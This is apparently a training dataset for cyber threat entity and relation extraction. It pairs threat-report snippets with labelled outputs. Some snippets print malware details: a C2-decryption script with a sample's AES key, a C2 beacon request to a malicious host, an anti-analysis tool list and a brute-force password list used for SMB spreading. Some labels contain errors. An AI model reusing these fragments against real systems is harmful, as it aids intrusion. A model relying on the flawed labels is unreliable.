(aa124a4b4df12b34e74ee7f6c683b2ebec4ce9a8edcf9be345823b4fdcf5d868, variants, 3CX DesktopApp), (59e1edf4d82fae4978e97512b0331b7eb21dd4b838b850ba46794d9c7a2c0983, variants, 3CX DesktopApp), (7986bbaee8940da11ce089383521ab420c443ab7b15ed42aed91fd31ce833896, SHA256, ffmpeg.dll), (3CX DesktopApp, load, ffmpeg.dll), (11be1803e2e307b647a8a7e02d128335c448ff741bf06bf52b332e0bbf423b03, SHA256, d3dcompiler_47.dll), (3CX DesktopApp, load, d3dcompiler_47.dll), (d3dcompiler_47.dll, is, Trojan), (3CX DesktopApp, load, 5D41402ABC4B2A76B9719D911017C592)"}
{"instruction": "import Crypto.Hash.SHA256 import Crypto.PublicKey.RSA import Crypto.Signature.pkcs1_15 import Crypto.Util.Padding import base64 # from sample aes_key = b\"cYIoouG6CRk3ds6dZAfRdQOomHfxOFJ6\" aes_iv = b\"FjP2PQfztKZ7vKxL\" rsa_certificate = \"MIIFazCCA1OgAwIBAgIUQDUa4ddMSiYJ+8dB2v1yF6kfWsQwDQYJKoZIhvcNAQELBQAwRTELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUxITAfBgNVBAoMGEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDAeFw0yMDA3MjMxODIxMzdaFw0yMDA4MjIxODIxMzdaMEUxCzAJBgNVBAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEwHwYDVQQKDBhJbnRlcm5ldCBXaWRnaXRzIFB0eSBMdGQwggIiMA0GCSqGSIb3DQEBAQUAA4ICDwAwggIKAoICAQDeWLWJkfkpeRy9Bw7OIkJCQs7cO06qrD5vgFNI9p47cVYyf0NH5FuqX41veoTTBe+iA/77j1L/ffO5qCBFkct/d7YpNsCDjfoqjoL6T6GJ5WGPU/9uR7GctoXoESUdq03TYw8GttIq25EyyWUfjsNL/iljVomiffAJTKkcnOKnA0NYgrWmgxghiJGNXwHbYau9NH7hAthYZcBUxzWqTS8hCI2fupQ14yoAwU0YlYpL5XtmzkCpK0qCU++G5fPr0utTp8qnKTFExwI4oFt6Umj4Z13P1EUQRetSPKva7JpNq00UVOketKFnawu99VJx1SIsQWOZ6BvOLS7QYIBdiblFzHaXxZ0ndbVTFMcSC9G3HroVlTAMWgtkZiiZr3LpuX0U1s7e+uqvkZxw+dggIfkEdKA0p2iayu80MEBJvZoyFY/11ugyaOhDlFtVlQ8rqc40IkgfM9RmxeuAhAdQfhpxaPLV/5v1OyGsG1fKETSNTVaxMlbGUsY1LwNvXeF576P9YEHpDgSg4zeWec7xrc6WWY2A5TZnyt2Pzd4G8oOjgtFHV0ZqqU8ogEizZEZ5Fs3mAi3N4N7FCrjf0QygQuksvbfi8Iim8DGmkMXzCihnN3suLOP4noWSrPfxEblY1QPiS+WK9y4kVtsJl/seohbI1P7XCUrdESvKxgBK6ziy6QIDAQABo1MwUTAdBgNVHQ4EFgQUfakZej+WCNaJNFfZ/2V2Yn9e0h8wHwYDVR0jBBgwFoAUfakZej+WCNaJNFfZ/2V2Yn9e0h8wDwYDVR0TAQH/BAUwAwEB/zANBgkqhkiG9w0BAQsFAAOCAgEARQEHcfMK2hM77F6ua/o+Y9NGE4QsFuUtGKVT/hPXF3wJuq7rpkdk8G8bksMrCBFg+XhlYM8pyTvrpqunl5Dgoew1niuwlNI2fXOsXpUSu1Gtu+5zU3gsjisnOexWZwQjBJINPzLHpsM9GrBSJXl97x50mBzkjwDU7uhNN8mfQ47GOqsZSnrUhOVIdZo7cnfmDjsSiJ3XIv122zGQCwgvHTCKctpF+hwm5IuJ+9BfAh3zTuqJ/VPkJrnKoW0dx/uaJOqSW3sjWHlIV1QRm+sRk5cGhUvIn8gU0P84rgzDcqNJC0+0GEuX/MbGzjf2nu4ow6SXNziCb4Jb4DN9YN83qXpvJC+TI0097t/3ZuZhPPuaPWpjuhMNmBafT8ImLs96VSbv7ps50lFn0R94KXNKlYJH4mncQiZo4YPEQ6WpcVjhoTR06cbAu7WgSrVMSk6CBTWjjbGLg7p579qn+Yskk4OxWB3kzig7You+z0nM2dwrQAKz3yztK7bVEsgPT/eoLjnvkKnwIkN5hwQZNXUigO/1HKcTgGFz1A8dG+qXd7ZGCoxJ7vRab1vxzMdO7VDaJJXJUUrwVZVR/xBt2Xg0yfHWQ10oiK4z9aI1F/YMhI1I3rbUAjVySLyzZSSkz2/6xQZRtcEWbrFbBI9ko8Kb752poOKybEvmM6sE33J4dvk=\" def disect_response(body): decoded_body = base64.b64decode(body) cipher = Crypto.Cipher.AES.new(aes_key, Crypto.Cipher.AES.MODE_CBC, IV=aes_iv) decrypted_body = cipher.decrypt(decoded_body) signed_message = Crypto.Util.Padding.unpad(decrypted_body, cipher.block_size) message, signature = signed_message.rsplit(b\"@\") print(\"message:\", message) print(\"signature:\", signature) rsa_public_key = Crypto.PublicKey.RSA.import_key(base64.b64decode(rsa_certificate)) rsa_verifier = Crypto.Signature.pkcs1_15.PKCS115_SigScheme(rsa_public_key) message_hash = Crypto.Hash.SHA256.new(message) rsa_verifier.verify(message_hash, base64.b64decode(signature)) print(\"signature verification: PASS\") disect_response(\"J2dHYN2DE/N7JQj5ZdxyMVjISfLstuKFQjzMhEcxqaTQvAb3hpYZXlGHMn3mSoG3++twgiJEAjadSFco/P7qgd9mZz+4rzTksF23RJ0BsTRzH7Z2tAF0b62gwh+jTVgeupvenZoqw1+h/YKaF/lknZ11Cp5dgVKe9mxifc1b7t2FpTeqYMhT5NoyoWx/99mxyBt9OSDzJviK3fhJq+yhCDsZ3TWsYdZBAU2q0gQGYbmGT1w1DSbF+bcZ3rL47RHBKK2+NpkKmVMSoaL2d6SyGxom++MEiwIRTkhVtewxZPuXOeJ9AbZ9VqEnBo+77T3x7sxgX19PO8z9Rdbp7uHJ/8HLXEZcQnHjHBbRPQQcCFH5R/XNLmIHjaRApikb8QuRVJAVdDmNnpRpExWIbZ7k0R6AjiPDkuIAK+bj3v11HnQbVxIDBj9/GUI6XZDVACnSyUkeNprXB+FyC/ppfwwzyvtHj/BTyAX5UFfeghFym7qRa3UxZxw5H/PTukCPkdquEw/zXdlEf6hj0/2GNXHIhamrXeJ8WPfpsnHhgYaSHi83CKE6y2WMUdrCxeXgdvUg5sD6qyqrIiP+VLQeN22gIKuGlE1lh2Mm2JcrnHKq6P2G9fu2E6ZzoKL8N8KfuzCc8JqTGHVhjCDkSEgUCT8iXbvI6VqScV3vZ1Irc5Gd1T6w2NF4wd2zsRWAO7s+0aFCcKsFv0MHkYNpZPWdOX+tTgJZFigbsJ/IOHXSyxfUN0MLeEDEAbR9ymFB3uU9bbfeNlUWlVJxenLRtQLHxJDXQFBugRfFM0nJVxPIZHWcj22dlnyrqYUIX5Q8X8qNsXkz64DsrTBXMa52LrgeKDKNrQw+7Xpat5601VXUM80CVIfwhmmC5LiLP9ef0NuuDtkMDiX8KQdAWlMknOq8N0Z2TxKnznlCoJ27f0VSCVYD/3iepe5f+8EPD3Ob7CPOs0zB\") The malware then starts communicating with the decoded URL by sending details about the infected computer: POST /mafia/login.php HTTP/1.1 User-Agent: VerbleConnectTM Content-Type: application/x-www-form-urlencoded charset: utf-8 Cache-Control: no-cache Pragma: no-cache Host: gaymers.ax Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2 Connection: keep-alive Content-Length: 291 id=il~aSS_3ZNaXHMGXLExSyzp6xMrxMB7zCw1zFndLA87jjqd0tPsFqY31LF65YGEt&os=5i1E5v8J8fUqwpvNWkN6QQ&pv=6qWqTXHlWudJmSz_fuWcBA&ip=VfseCVZvINz5rCbXun59pfGFCSmrpUXBVtrqt_4REs8&cn=QN9v6e3VlZM1oosbryBr~7DoU95gMv4JDw68m35voF0&lr=ZrXBJ3IJZ5ymR2zc1~faVQ&ct=GOi8TbTvN6vucG76f8fCGg&bv=tdCMf_RP_QPO3xfcoRGJww The request body contains the following information about the infected machine in encrypted form: \"id\" is [INFECTION_ID \"os\" is OS version, e.g. \"Windows 10\" \"pv\" is \"Admin\" when running with Administrator privileges \"ip\" is JAR pathname \"cn\" is \"[USER_NAME]@[COMPUTERNAME]\" \"lr\" has value \"00:00:00\"", "input": null, "output": "No related entities and relations."}
{"instruction": "48 8D 95 ?? ?? 00 00 // lea rdx, [rbp+0A0h+dwSize] 48 8B CB // mov rcx, rbx E8 ?? ?? ?? ?? // call sub_1800095A0 4D 8B C6 // mov r8, r14 33 D2 // xor edx, edx 49 8B CF // mov rcx, r15 E8 ?? ?? ?? ?? // call sub_180038610 33 D2 // xor edx, edx ; dwSize 41 B8 00 80 00 00 // mov r8d, 8000h ; dwFreeType 49 8B CF // mov rcx, r15 ; lpAddress FF 15 ?? ?? ?? ?? // call cs:VirtualFree 48 8B 95 ?? ?? 00 00 // mov rdx, [rbp+0A0h+dwSize] 48 85 D2 // test rdx, rdx 74 1B // jz short l_1 48 8B CB // mov rcx, rbx 80 31 ?? // l_0: xor byte ptr [rcx], 39h 48 FF C1 // inc rcx", "input": null, "output": "No related entities and relations."}
{"instruction": "idr 8129411991672431889 ildasm 15997665423159927228 ilspy 10829648878147112121 jd-gui 9149947745824492274 lordpe 3656637464651387014 officemalscanner 3575761800716667678 ollydbg 4501656691368064027 pdfstreamdumper 10296494671777307979 pe-bear 14630721578341374856 pebrowse64 4088976323439621041 peid 9531326785919727076 pe-sieve32 6461429591783621719 pe-sieve64 6508141243778577344 pestudio 10235971842993272939 peview 2478231962306073784 pexplorer 9903758755917170407 ppee 14710585101020280896 procdump64 13611814135072561278 procdump 2810460305047003196 processhacker 2032008861530788751 procexp64 27407921587843457 procexp 6491986958834001955 procmon 2128122064571842954 prodiscoverbasic 10484659978517092504 py2exedecompiler 8478833628889826985 r2agent 10463926208560207521 rabin2 7080175711202577138 radare2 8697424601205169055 ramcapture64 7775177810774851294 ramcapture 16130138450758310172 reflector 506634811745884560 regmon 18294908219222222902 resourcehacker 3588624367609827560 retdec-ar-extractor 9555688264681862794 retdec-bin2llvmir 5415426428750045503 retdec-bin2pat 3642525650883269872 retdec-config 13135068273077306806 retdec-fileinfo 3769837838875367802 retdec-getsig 191060519014405309 retdec-idr2pat 1682585410644922036 retdec-llvmir2hll 7878537243757499832 retdec-macho-extractor 13799353263187722717 retdec-pat2yara 1367627386496056834 retdec-stacofin 12574535824074203265 retdec-unpacker 16990567851129491937 retdec-yarac 8994091295115840290 rundotnetdll 13876356431472225791 sbiesvc 14968320160131875803 scdbg 14868920869169964081 scylla_x64 106672141413120087 scylla_x86 79089792725215063 shellcode_launcher 5614586596107908838 solarwindsdiagnostics 3869935012404164040 sysmon64 3538022140597504361 sysmon 14111374107076822891 task explorer 7982848972385914508 task explorer-x64 8760312338504300643 tcpdump 17351543633914244545 tcpvcon 7516148236133302073 tcpview 15114163911481793350 vboxservice 15457732070353984570 win32_remote 16292685861617888592 win64_remotex64 10374841591685794123 windbg 3045986759481489935 windump 17109238199226571972 winhex64 6827032273910657891 winhex 5945487981219695001 winobj 8052533790968282297 wireshark 17574002783607647274 x32dbg 3341747963119755850 x64dbg 14193859431895170587 xwforensics 17683972236092287897 xwforensics64 17439059603042731363", "input": null, "output": "No related entities and relations."}
{"instruction": "Microsoft\u2019s first Patch Tuesday release of 2020 disclosed a serious vulnerability in Windows CryptoAPI ( CVE-2020-0601 ), a core component of the Windows operating system that handles cryptographic operations. Hackers were again quick to incorporate this vulnerability into their attacks, with blocked exploit attempts ( Web Attack: Microsoft Windows CVE-2020-0601 ) reaching almost 82,500 in January. Attempts to exploit these vulnerabilities were blocked by Symantec\u2019s Intrusion Prevention System (IPS). Figure 6. CryptoAPI vulnerability exploit attempts blocked", "input": null, "output": "Named Entities: (CVE-2020-0601, vulnerability)\nRelationships: No related relations."}
{"instruction": "Passwords: 123, 1234, 12345, 123456, 1234567, 12345678, 123456789, 1234567890, 123123, 12321, 123321, 123abc, 123qwe, 123asd, 1234abcd, 1234qwer, 1q2w3e, a1b2c3, administrator, Administrator, admin, Admin, admin123, Admin123, admin12345, Admin12345, administrator123, Ad ministrator123, nimda, qwewq, qweewq, qwerty, qweasd, asdsa, asddsa, asdzxc, asdfgh, qweasdzxc, q1w2e3, qazwsx, qazwsxedc, zxcxz, zxccxz, zxcvb, zxcvbn, passwd, password, Password, login, Login, pass, mypass, mypassword, adminadmin, root, rootroot, test, testtest, temp, temptemp, foofoo, foobar, default, password1, password12, password123, admin1, admin12, admin123, pass1, pass12, pass123, root123, abc123, abcde, abcabc, qwe123, test123, temp123, sample, example, internet, Internet If access is granted, the malware uses the SMB protocol to copy itself to the remote machine. It then uses the Windows Service Control Manager to start the SMB component\u2019s process on the remote machine. The sample running on the remote machine also checks for the presence of winsvcs.txt, which again determines whether or not Nemty is downloaded and executed.", "input": null, "output": "No related entities and relations."}
{"instruction": "Retooled Waterbug\u2019s most recent campaigns have involved a swath of new tools including custom malware, modified versions of publicly available hacking tools, and legitimate administration tools. The group has also followed the current shift towards \u201cliving off the land,\u201d making use of PowerShell scripts and PsExec, a Microsoft Sysinternals tool used for executing processes on other systems. Aside from new tools already mentioned above, Waterbug has also deployed: A new custom dropper typically used to install Neptun as a service. A custom hacking tool that combines four leaked Equation Group tools (EternalBlue, EternalRomance, DoublePulsar, SMBTouch) into a single executable. A USB data collecting tool that checks for a connected USB drive and steals certain file types, encrypting them into a RAR file. It then uses WebDAV to upload to a Box cloud drive.", "input": null, "output": "Named Entities: (Retooled Waterbug, attacker), (PowerShell script, tool), (PsExec, tool), (EternalBlue, tool), (EternalRomance, tool), (DoublePulsar, tool), (SMBTouch, tool)\nRelationships: (Retooled Waterbug, use, PsExec), (Retooled Waterbug, use, Equation Group tools), (Equation Group tools, include, EternalBlue), (Equation Group tools, include, EternalRomance), (Equation Group tools, include, DoublePulsar), (Equation Group tools, include, SMBTouch)"}
{"instruction": "Opportunistic sowing of confusion: If a false flag operation wasn\u2019t planned from the start, it is possible that Waterbug discovered the Crambus intrusion while preparing its attack and opportunistically used it in the hopes of sowing some confusion in the mind of the victim or investigators. Based on recent leaks of Crambus internal documents , its Poison Frog control panel is known to be vulnerable to compromise, meaning it may have been a relatively trivial diversion on the part of Waterbug to hijack Crambus\u2019s infrastructure. A compromise conducted by one threat actor group through another's infrastructure, or fourth party collections, has been previously discussed in a 2017 white paper by Kaspersky researchers .", "input": null, "output": "No related entities and relations."}
{"instruction": "Threat Intelligence \nThe DeepSight Managed Adversary and Threat Intelligence (MATI) team co-authored this blog and its customers have received intelligence with additional details about these campaigns, the characteristics of the Waterbug (aka Turla) cyber espionage group, and methods of detecting and thwarting activities of this adversary.", "input": null, "output": "Named Entities: (Waterbug, attacker), (Turla, attacker)\nRelationships: No related relations."}
{"instruction": "Cryptojacking Extensions Found on Google Chrome Web Store", "input": null, "output": "No related entities and relations."}
{"instruction": "Main accounts generally were \u201dfake news\u201d outlets masquerading as regional news outlets, or pretending to be political parties or hashtag games\u2014the popular Twitter game that involves people sharing anecdotes or jokes based on a single theme, such as #5WordsToRuinADate. Based on their creation date they were usually created individually or in small batches. The default language selected for main accounts was always either English or Russian. Auxiliary accounts usually pretended to be individuals, spreading the content created by the main accounts by retweeting it. These accounts were usually created in batches and sometimes hundreds of auxiliary accounts were created on the same day. For example, during May 2014, seven fake news accounts were set up by the agency, along with 514 auxiliary accounts.", "input": null, "output": "No related entities and relations."}
{"instruction": "SGX-based malware may not be as troublesome as believed. We'll explain why that is and how Symantec is ready to deal with such malware if they were to appear. A group of security researchers from Graz University of Technology recently disclosed detailed methods of deploying attacks from inside Intel's SGX Security Enclave . The research paper received decent media attention probably due to recently discovered architecture vulnerabilities, such as Meltdown and Spectre . Researchers also released proof of concept (PoC) code for Linux that successfully escapes the securely enclosed environment.", "input": null, "output": "No related entities and relations."}
{"instruction": "All the malicious trusted component needs to do is to place its own code within a cave in the executable memory space and redirect the code execution path to the cave. That can be achieved by a return-oriented programming (ROP) technique. ROP code lives on the stack as a series of addresses which will be used as return addresses. This code will be executed in sequence by calling API functions provided by the operating system and other well-known software libraries. When a trusted component returns from execution, the SGX will switch the CPU state to normal and restore the runtime environment so that the untrusted component can continue its execution. Now the return address has already been manipulated by the malware and the ROP code will perform malicious activities, including marking the code inside the cave executable and running it.", "input": null, "output": "No related entities and relations."}
{"instruction": "It might be able to get in, but it will be blocked every time it tries to get out. It's like the plot to the movie Law Abiding Citizen , where the criminal protagonist wants to be in prison so that he can commit perfect crimes\u2014but we change the story so that he cannot break out of his cell. The rest of the movie is about how he gets caught every single time he tries to escape, and that's how it is for malware inside the SGX enclave\u2014trapped. When the research was initially released, Intel reiterated SGX's value is to execute code in a protected enclave, but it does not guarantee the code executed in the said enclave comes from a trusted source. In all cases, Intel recommends utilizing programs, files, apps, and plugins from trusted sources.", "input": null, "output": "No related entities and relations."}
{"instruction": "Cryptojacking campaign we have dubbed Beapy is exploiting the EternalBlue exploit and primarily impacting enterprises in China. Beapy is a cryptojacking campaign impacting enterprises that uses the EternalBlue exploit and stolen and hardcoded credentials to spread rapidly across networks. Beapy activity was first seen in Symantec telemetry in January 2019. This activity has also been seen on web servers and has been increasing since the beginning of March. Beapy ( W32.Beapy ) is a file-based coinminer that uses email as an initial infection vector. This campaign demonstrates that while cryptojacking has declined in popularity with cyber criminals since its peak at the start of 2018, it is still a focus for some of them, with enterprises now their primary target.", "input": null, "output": "Named Entities: (Beapy, malware), (Cryptojacking, threat type)\nRelationships: (Beapy, for, Cryptojacking)"}
{"instruction": "What causes these leaks? More than half (57 percent) of the sites I tested send a confirmation email to customers with a direct access link to their booking. This is provided for the convenience of the customer, allowing them to simply click on the link and go straight to their reservation without having to log in. More than half (57 percent) of the hotel sites send a confirmation email to customers with a direct access link to their booking.", "input": null, "output": "No related entities and relations."}
{"instruction": "Moreover, targeted attack groups may also be interested in the movements of business professionals and government employees. A number of APT groups such as DarkHotel/Armyworm, OceanLotus/Destroyer, Swallowtail , and Whitefly are known to have compromised targets in the hospitality sector. There are various reasons why these groups are interested in this sector, including for general surveillance purposes, tracking a target's movements, identifying individuals accompanying them, or finding out how long someone is staying in a particular place. It could also allow for physical access to a target's location.", "input": null, "output": "Named Entities: (DarkHotel/Armyworm, attacker), (OceanLotus/Destroyer, attacker), (Swallowtail, attacker), (Whitefly, attacker)\nRelationships: No related relations."}
{"instruction": "Questionable content \nAll these apps show their unsavory content at start time (see Figures 3 and 4 for examples). \nFigure 3. Screenshots of ASHLEY MADISSON DATING UPDATES and Grindr Updates at start time \nFigure 4. Screenshots of Unique Casino and Virgin Games Updates at start time \nAt the same time, none of the apps state this behavior in the description section on the app store page. In fact, the apps all display innocuous screenshots provided by the developers, which are totally unrelated to the real functionality of the apps. \nFigure 5. Actual screenshot of what the Grindr Updates app displays (left) and the screenshot provided by the developer (right)", "input": null, "output": "No related entities and relations."}
{"instruction": "Betfred Updates https://www.microsoft.com/en-us/p/betfred-updates/9nzjrz06q2lt?activetab=pivot:overviewtab Kevilum Bwin Scommesse REMOVED FROM STORE mitchelljordan999 McAfee Antivirus Updates News REMOVED FROM STORE Williamswill1212 Kraken. REMOVED FROM STORE jacobapps2017 888Poker Application REMOVED FROM STORE CharlesDavid91881 Bet365 Updates App REMOVED FROM STORE CharlesDavid91881 bet365 sports app https://www.microsoft.com/en-us/p/bet365-sports-app/9mwrg4l37ktm?activetab=pivot:overviewtab StephanAppsz casino.com https://www.microsoft.com/en-us/p/casinocom/9mwd36qr7gwg#activetab=pivot:overviewtab StephanAppsz Gala Bingo Application https://www.microsoft.com/en-us/p/gala-bingo-application/9n0kwf10586v?activetab=pivot:overviewtab NathanMachan 888 Sport Application https://www.microsoft.com/en-us/p/888-sport-application/9nvwcs4d6zql?activetab=pivot:overviewtab Cityvesse Poker-Stars https://www.microsoft.com/en-us/p/poker-stars/9nz5bfk0nv1l?activetab=pivot:overviewtab Cityvesse Ratucasino88 Games and News https://www.microsoft.com/en-us/p/ratucasino88-games-and-news/9nqzcb711xl9?activetab=pivot:overviewtab TimothyJack6595 Nossaaposta App https://www.microsoft.com/en-us/p/nossaaposta-app/9pf3kpkqs4ts#activetab=pivot:overviewtab TimothyJack6595 Parx Casino https://www.microsoft.com/en-us/p/parx-casino/9n6mfg0c2hmm?activetab=pivot:overviewtab Alexand Develop Fortuna Application https://www.microsoft.com/en-us/p/fortuna-application/9nq79cghdnfd?activetab=pivot:overviewtab AllenKevin19929 Bet90 https://www.microsoft.com/en-us/p/bet90/9nw8snjbq3q2#activetab=pivot:overviewtab AllenKevin19929 Allslots. REMOVED FROM STORE johnsonapps2014 Bitstamp App REMOVED FROM STORE RonaldHuffapps CoinMarketCap Application REMOVED FROM STORE RonaldHuffapps AFF Dating Updates App https://www.microsoft.com/en-us/p/aff-dating-updates-app/9pjbsm19rdt3#activetab=pivot:overviewtab Dmimty Developer YouWin App https://www.microsoft.com/en-us/p/youwin-app/9ngpzh3rwrg4#activetab=pivot:overviewtab Dmimty Developer Boxing App REMOVED FROM STORE ClintSaunders88181 Lottoland https://www.microsoft.com/en-us/p/lottoland/9nz2s1kd3684?activetab=pivot:overviewtab ArcadiyDevelop Fafafa gold slots https://www.microsoft.com/en-us/p/fafafa-gold-slots/9p1n9f1sbkbj?activetab=pivot:overviewtab ArcadiyDevelop ASHLEY MADISSON DATING UPDATES APP https://www.microsoft.com/en-us/p/ashley-madisson-dating-updates-app/9mxz2846jdj4?activetab=pivot:overviewtab New Nice Company Dev Open365 https://www.microsoft.com/en-us/p/open365/9ng9d3z8pm2p?activetab=pivot:overviewtab New Nice Company Dev Poker. https://www.microsoft.com/en-us/p/poker/9nlql7f55fmg?activetab=pivot:overviewtab HoangVanLoc eSports Betting https://www.microsoft.com/en-us/p/esport-betting/9pcmtm4d5q96?activetab=pivot:overviewtab HoangVanLoc Jackpotjoy REMOVED FROM STORE Anthonyturnerapps", "input": null, "output": "No related entities and relations."}
{"instruction": "The Shamoon connection \nElfin came under the spotlight in December 2018 when it was linked with a new wave of Shamoon attacks. One Shamoon victim in Saudi Arabia had recently also been attacked by Elfin and had been infected with the Stonedrill malware ( Trojan.Stonedrill ) used by Elfin. Because the Elfin and the Shamoon attacks against this organization occurred so close together, there has been speculation that the two groups may be linked. However, Symantec has found no further evidence to suggest Elfin was responsible for these Shamoon attacks to date.\u00a0 We continue to monitor the activities of both groups closely.", "input": null, "output": "Named Entities: (Elfin, attacker), (Stonedrill, malware)\nRelationships: (Elfin, use, Stonedrill), (Elfin, attack, Shamoon attacks)"}
{"instruction": "Elfin\u2019s toolset Elfin has deployed a wide range of tools in its attacks including custom malware, commodity malware, and open-source hacking tools. Custom malware used by the group include: Notestuk ( Backdoor.Notestuk ) (aka TURNEDUP): Malware that can be used to open a backdoor and gather information from a compromised computer. Stonedrill ( Trojan.Stonedrill ): Custom malware capable of opening a backdoor on an infected computer and downloading additional files. The malware also features a destructive component, which can wipe the master boot record of an infected computer. AutoIt backdoor: A custom built backdoor written in the AutoIt scripting language. In addition to its custom malware, Elfin has also used a number of commodity malware tools, available for purchase on the cyber underground. These include: Remcos ( Backdoor.Remvio ): A commodity remote administration tool (RAT) that can be used to steal information from an infected computer.", "input": null, "output": "Named Entities: (Elfin, attacker), (Backdoor.Notestuk, malware), (TURNEDUP, malware), (Trojan.Stonedrill, malware), (AutoIt backdoor, malware), (Backdoor.Remvio, malware)\nRelationships: (Elfin, use, Backdoor.Notestuk), (Backdoor.Notestuk, aka, TURNEDUP), (Elfin, use, Trojan.Stonedrill), (Elfin, use, AutoIt backdoor), (Elfin, use, Backdoor.Remvio)"}
{"instruction": "Supply chain attacks attempt to exploit third-party services and software to compromise a final target. Hijacked software updates are one of the most common forms of supply chain attack. Similar campaigns in the past include the CCleaner attacks and the Petya campaign. Symantec noted in its latest ISTR report how supply chain attacks increased by 78 percent in 2018. Thanks to Kaspersky for sharing details related to these attacks.", "input": null, "output": "No related entities and relations."}
{"instruction": "Disrupting the Attack Chain Through Detecting Credential Dumping", "input": null, "output": "No related entities and relations."}
{"instruction": "Suspicious remote execution of multi-purpose tools such as PSExec, Powershell, and Windows Management Instrumentation clients in an enterprise Suspicious activity around Windows Administrative Shares Suspicious activity around Windows Remote Management Exploitation of remote services within the customer network Subverting logon scripts to establish persistence on endpoints In addition to the detection provided by SEDR, Symantec Endpoint Protection (SEP) uses a variety of technologies to block credential-dumping techniques, including: Behavior analysis \u2013 performs real time analysis of all running processes Reputation \u2013 correlates information about a program across telemetry from millions of Symantec customers Emulation \u2013 performs pre-execution evaluation of the process's activity Heuristics \u2013 looks for known suspicious attributes of a program that are associated with credential dumping Machine Learning \u2013 uses techniques that mimic the human brain to identify malicious processes Alerts from these technologies are displayed in SEP as: SONAR.DumpSAM!gen2 SONAR.PWDumpX!gen1 SONAR.SuspInject!gen3 Pwdump Hacktool.PasswdDumper SONAR.Mimikatz!gen3 SONAR.Mimikatz!gen8 SONAR.Mimikatz!gen9 SONAR.Mimikatz!gen12", "input": null, "output": "Named Entities: (PSExec, tool), (Powershell, tool), (Windows Management Instrumentation, tool)\nRelationships: No related relations."}
{"instruction": "Yet the threat landscape is not just about crime and the quest for cash. Nation-states quickly adopted the internet for espionage and have used it for destructive purposes. Late last year, Shamoon notably reemerged after a two-year absence , deploying wiping malware to delete files on computers of targeted organizations in the Middle East. Nearly one in ten targeted attack groups now use malware to destroy and disrupt business operations, a 25 percent increase from the previous year. They also continue to refine their attack techniques, favoring spear phishing over zero days and using living off the land techniques to maintain a low profile and hide their attacks in a sea of legitimate IT processes. Nearly one in ten targeted attack groups now use malware to destroy and disrupt business operations, a 25 percent increase from the previous year.", "input": null, "output": "Named Entities: (Shamoon, attacker)\nRelationships: No related relations."}
{"instruction": "In fact, Symantec's Targeted Attack Analytics (TAA) technology discovered an attack group called Gallmaker in 2018 that needed no malware at all to infiltrate its targets. As attackers continue to use our own tools against us, detection must evolve from identifying malware to determining intent. Solutions based on machine learning and advanced artificial intelligence, like TAA, are increasingly critical for detecting attacks.", "input": null, "output": "No related entities and relations."}
{"instruction": "Shared domain name servers \nFrom the apps\u2019 network traffic, we found the hosting server for each app. Through a Whois query, we found that all of these servers actually have the same origin. Therefore, these apps were most likely published by the same developers using different names. \nFigure 6. A quick Whois lookup shows the apps\u2019 servers have the same origin \nWe have informed Microsoft and Google about these apps\u2019 behaviors. Microsoft has removed the apps from their store. The mining JavaScript has also been removed from Google Tag Manager.", "input": null, "output": "No related entities and relations."}
{"instruction": "ICD and a Platform Shift: A LIVE Digital News Event from Symantec Join us for a digital news event to hear how Symantec and our partners are working together to drive down the cost and complexity of cyber security, while protecting enterprises against sophisticated threats. Learn more about our Integrated Cyber Defense platform. REGISTER NOW FOR THIS EVENT", "input": null, "output": "No related entities and relations."}
{"instruction": "Microsoft Patch Tuesday \u2013 February 2019", "input": null, "output": "No related entities and relations."}
{"instruction": "Quick scan, quick scam Toward the end of 2018, we observed a tech support scam campaign that displays a fake Windows alert, warning the victim that their computer might be infected. The scam prompts the victim to approve a supposedly quick 10-second scan of their computer. Figure 1. Fake infection alert prompts the victim to allow a \"quick scan\" of their computer Once the user clicks OK, the scammers pull off a highly convincing but fake system scan that is almost identical to Norton Security's. We will provide details on how exactly the scammers pull this off later in this blog. Figure 2. Clicking OK initiates a bogus system scan that looks very similar to Norton Security's", "input": null, "output": "No related entities and relations."}
{"instruction": "Four types of attacks Symantec has observed four distinct attack campaigns directed against financial targets in Africa. The first has been underway since at least mid-2017 and has targeted organizations in Ivory Coast and Equatorial Guinea. The attackers infected victims with commodity malware known as NanoCore ( Trojan.Nancrat ) and were also observed using PsExec, a Microsoft Sysinternals tool used for executing processes on other systems, on infected computers. Lure documents used by the attackers referred to a West African bank which has operations in several countries in the region. Some tools used in these attacks are similar to tools mentioned in a 2017 SWIFT alert, indicating the attackers may have been attempting to perform financial fraud.", "input": null, "output": "Named Entities: (NanoCore, malware), (Trojan.Nancrat, malware), (PsExec, tool)\nRelationships: (NanoCore, aka, Trojan.Nancrat), (NanoCore, use, PsExec)"}
{"instruction": "The second type of attack began in late 2017 and targeted organizations in Ivory Coast, Ghana, Congo (DR), and Cameroon. The attackers used malicious PowerShell scripts to infect their targets and also used the credential-stealing tool Mimikatz ( Hacktool.Mimikatz ). They also made use of UltraVNC, an open-source remote administration tool for Microsoft Windows. The attackers then infected computers with the commodity malware known as Cobalt Strike ( Trojan.Agentemis ) which is capable of opening a backdoor on the computer, communicating with a command and control (C&C) server, and downloading additional payloads. Communication with the C&C server was handled by dynamic DNS infrastructure, which helped shield the location of the attackers.", "input": null, "output": "Named Entities: (Hacktool.Mimikatz, tool), (UltraVNC, tool), (Cobalt Strike, malware), (backdoor, threat type)\nRelationships: (attacker, use, Hacktool.Mimikatz), (rattacker, use, UltraVNC), (attacker, use, Cobalt Strike), (Cobalt Strike, for, backdoor)"}
{"instruction": "Microsoft Patch Tuesday \u2013 January 2019", "input": null, "output": "No related entities and relations."}
{"instruction": "This month the vendor has patched 49 vulnerabilities, 7 of which are rated Critical. As always, customers are advised to follow these security best practices: Install vendor patches as soon as they are available. Run all software with the least privileges required while still maintaining functionality. Avoid handling files from unknown or questionable sources. Never visit sites of unknown or questionable integrity. Block external access at the network perimeter to all key systems unless specific access is required. Microsoft's summary of the January 2019 releases can be found here: https://portal.msrc.microsoft.com/en-us/security-guidance This month's update covers vulnerabilities in: Internet Explorer Microsoft Edge ChakraCore Microsoft Office Microsoft Exchange Microsoft Windows Jet Database Engine Microsoft ASP.NET Visual Studio Skype for Android The following is a breakdown of the issues being addressed this month: Cumulative Security Update for Microsoft Browsers Chakra Scripting Engine Memory Corruption Vulnerability", "input": null, "output": "No related entities and relations."}
